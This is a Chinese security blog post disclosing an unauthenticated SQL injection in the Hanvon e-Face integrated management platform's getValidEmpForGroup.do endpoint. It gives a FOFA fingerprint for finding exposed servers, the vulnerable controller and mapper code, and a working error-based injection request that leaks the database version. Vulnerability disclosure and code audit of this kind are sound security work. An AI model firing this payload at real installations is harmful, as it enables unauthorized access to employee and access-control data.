---
title: "汉王e脸通综合管理平台 getValidEmpForGroup.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getValidEmpForGroup-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getvalidempforgroup.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getValidEmpForGroup.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/10 08:28
- 924浏览
- [0评论](#comment)
- 45分钟阅读

深入探索

软件

安全

认证

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getValidEmpForGroup.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `AuthMultiplePeopleOpenController` 里关于 `getValidEmpForGroup` 的实现

```
public RequestJson getValidEmpForGroup(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String key, @RequestParam(required = false) Long departmentId, @RequestParam(required = false) Long groupId, @RequestParam(value = "idsNotIn[]",required = false) Integer[] idsNotIn, @RequestParam(value = "fields[]",required = false) Integer[] fields, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        EmployeeGroupParam employeeGroupParam = new EmployeeGroupParam();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            if (null != key) {
                employeeGroupParam.setKey(key);
            }

            if (null != departmentId) {
                employeeGroupParam.setDepartmentId(departmentId);
            }

            if (null != groupId) {
                employeeGroupParam.setGroupId(groupId);
            }

            if (fields != null && fields.length > 0) {
                employeeGroupParam.setFields(fields);
            }

            employeeGroupParam.setOrder(order);
            employeeGroupParam.setColumnKey(columnKey);
            PageHelper.startPage(page, pageSize);
            List<EmployeeGroupEmployee> eges = this.authMultiplePeopleOpenAsm.selectValidPerson(employeeGroupParam, idsNotIn);
            PageInfo<EmployeeGroupEmployee> info = new PageInfo(eges);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccesManyPeopleGroupDao.xml

代码安全审计

```
<select id="selectValidPerson" resultType="com.hanvon.iface.tpm.access.EmployeeGroupEmployee">
    select EI.NG_ID id,EI.SZ_EMPLOY_ID AS attendanceCode,EI.SZ_NAME NAME,EI.NT_GENDER SEX,EI.SZ_TELEPHONE PHONE, ED.NG_ID AS departmentId, ED.SZ_NAME AS departmentName
    from SYS_USER EI
    left join sys_user_branch sub on sub.ng_user_id = EI.NG_ID
    left join SYS_BRANCH ED on ED.NG_ID=sub.NG_BRANCH_ID
    where EI.NT_USER_STATE = 1  and
    EI.NG_ID not in (select EMPLOYEE_ID from ACCESS_MANY_GROUP_EMPLOYEE AMGE WHERE AMGE.GROUP_ID=#{groupId})
    <if test="idsNotIn != null">
      AND EI.NG_ID not in
      <foreach close=")" collection="idsNotIn" index="index" item="item" open="(" separator=",">
        #{item}
      </foreach>
    </if>
    <if test="departmentId != null">
      AND ED.SZ_BRANCH_PATH like CONCAT((SELECT SZ_BRANCH_PATH from SYS_BRANCH WHERE NG_ID = #{departmentId,jdbcType=INTEGER}), '%')
    </if>
    <if test="key != null and key != ''">
      and ( EI.SZ_NAME like concat("%", #{key},"%")
      or  EI.SZ_EMPLOY_ID like concat("%", #{key},"%")
      or  EI.SZ_TELEPHONE like concat("%", #{key},"%")
      or  EI.SZ_MOBILE like concat("%", #{key},"%"))
    </if>
    <if test="fields != null">
      AND (
      <foreach close="" collection="fields" index="index" item="item" open="" separator=" or ">
        find_in_set(#{item},FIELDS)
      </foreach>
      )
    </if>
    order by
    <if test="order == null or order == ''">
      EI.SZ_EMPLOY_ID + 0 asc
    </if>
    <if test="order != null and order != ''">
      <if test="columnKey == 'attendanceCode' or columnKey == 'ATTENDANCE_CODE'">
        EI.SZ_EMPLOY_ID + 0 ${order}
      </if>
      <if test="columnKey != 'attendanceCode' and columnKey != 'ATTENDANCE_CODE'">
        ${columnKey} ${order}
      </if>
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/authMultiplePeople/getValidEmpForGroup.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getValidEmpForGroup.do SQL注入漏洞](images/img-001-d1f3b03d414e.webp)](https://image.mrxn.net/dbfe44f2f539440b81fc1ea57bca5b5f.webp)

成功利用报错注入获取到数据版本号

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
